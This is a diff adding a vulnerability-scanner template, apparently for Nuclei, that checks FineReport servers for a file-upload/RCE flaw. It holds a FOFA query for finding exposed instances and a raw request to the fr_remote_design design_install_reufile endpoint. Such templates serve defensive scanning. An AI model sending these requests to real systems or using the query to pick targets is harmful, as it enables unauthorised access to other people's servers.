@@ -1,0 +1,27 @@
+id: fanruan-uploadfile
+
+info:
+  name: Fanruan-uploadfile
+  author: proud
+  severity: high
+  description: |
+    帆软报表fr_remote_design文件上传
+  metadata:
+    verified: true
+    fofa-query: body="FineReport--Web Reporting Tool" || (body="/WebReport/ReportServer" && body="帆软") || title="青衣建材数据系统"
+  tags: rce,upload
+
+http:
+  - raw:
+      - |
+        GET /WebReport/ReportServer?op=fr_remote_design&cmd=design_install_reufile&reuFileName=vulntest.reu&isComplete=false HTTP/1.1
+        Content-Type: application/json
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'root')"
+          - "contains(body, 'whoami')"
+        condition: and
